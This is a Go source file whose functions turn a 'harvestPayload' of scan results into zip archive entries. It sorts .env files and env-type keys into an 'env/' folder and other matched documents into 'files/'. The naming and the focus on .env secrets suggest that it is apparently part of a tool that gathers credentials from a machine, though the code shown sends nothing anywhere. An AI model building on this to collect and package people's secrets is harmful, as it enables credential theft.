package main

import (
	"fmt"
	"path/filepath"
	"strings"

	"recovery/recovery"
)

func isEnvScannedFile(f recovery.FileResult) bool {
	name := strings.ToLower(f.Name)
	if name == ".env" || strings.HasPrefix(name, ".env.") {
		return true
	}
	return strings.ToLower(f.Ext) == ".env"
}

func appendEnvFileEntries(entries []archiveEntry, p *harvestPayload, seen map[string]bool) []archiveEntry {
	if p == nil || p.Result == nil {
		return entries
	}

	usedZip := make(map[string]int)
	add := func(path, name string) {
		if path == "" || seen[path] {
			return
		}
		seen[path] = true
		zipPath := uniqueFolder(envFileZipPath(path, name), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: path,
		})
	}

	for _, key := range p.Result.Keys {
		if key.Type != "env" {
			continue
		}
		add(key.Path, key.Name)
	}
	for _, f := range p.Result.Files {
		if !isEnvScannedFile(f) {
			continue
		}
		add(f.Path, f.Name)
	}
	return entries
}

func buildScannedFileEntries(p *harvestPayload) []archiveEntry {
	if p == nil || p.Result == nil {
		return nil
	}

	var entries []archiveEntry
	usedZip := make(map[string]int)
	for _, f := range p.Result.Files {
		if isEnvScannedFile(f) {
			continue
		}
		zipPath := uniqueFolder(scannedFileZipPath(f), usedZip)
		entries = append(entries, archiveEntry{
			zipPath:  zipPath,
			diskPath: f.Path,
		})
	}
	return entries
}

func envFileZipPath(fullPath, name string) string {
	parent := filepath.Base(filepath.Dir(fullPath))
	if parent == "" || parent == "." {
		parent = "root"
	}
	return "env/" + sanitizeFilename(parent) + "/" + name
}

func scannedFileZipPath(f recovery.FileResult) string {
	dir := f.Dir
	if dir == "" {
		dir = "Unknown"
	}
	return fmt.Sprintf("files/%s/%s", sanitizeFilename(dir), f.Name)
}

func scannedFilesSummary(count int) string {
	return fmt.Sprintf("Scanned files: %d\nPDF, TXT, images, documents, and other matched files.", count)
}